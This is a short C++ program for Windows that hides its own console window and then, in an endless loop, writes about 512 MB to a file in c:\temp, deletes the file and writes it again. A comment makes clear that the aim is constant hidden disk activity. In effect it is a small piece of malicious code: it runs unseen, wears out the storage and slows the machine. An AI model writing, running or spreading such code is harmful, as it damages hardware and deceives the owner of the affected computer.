#include <fstream>
#include <Windows.h>

using namespace std;

int main()
{
    // Hide console window
    HWND Invisible;
    AllocConsole();
    Invisible = FindWindowA("ConsoleWindowClass", NULL);
    ShowWindow(Invisible, 0);

    const char *path="c:\\temp\\var.txt";

    unsigned long int size_file = 536870912; // 512MB in bytes
    short int data(0);

    while(true)
    {
        ofstream file(path);
        for (int i=0; i<size_file; i++)
        {
            file << data;
        }
        remove("c:\\temp\\var.txt"); // Delete, another r+w action :D

        // Restart data allocating
    }

    return 0;
}
